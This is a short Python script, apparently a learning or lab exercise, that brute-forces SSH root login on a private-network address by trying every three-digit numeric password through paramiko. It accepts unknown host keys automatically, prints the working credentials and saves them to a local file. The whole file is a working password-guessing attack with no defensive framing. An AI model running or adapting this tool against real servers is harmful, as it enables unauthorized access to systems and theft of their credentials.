import itertools
import string

import paramiko


def logging_ssh(hostname, username, password):
    ssh_session = paramiko.SSHClient()
    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_session.connect(hostname=hostname, username=username, password=password, timeout=3)
        print(username, password)
        return True
    except paramiko.ssh_exception.AuthenticationException as error:
        print("Nie poprawne haslo lub login")
        ssh_session.close()
        return False


hostname = "192.168.55.8"
username = "root"
passwords = []

for guess_password in itertools.product(string.digits, repeat=3):
    password = "".join(guess_password)
    if logging_ssh(hostname=hostname, username=username, password=str(password)):
        with open(f"data/password_to_{username}.txt", "w") as f:
            f.write(f"login: root\nPassword: {password}")
        exit()
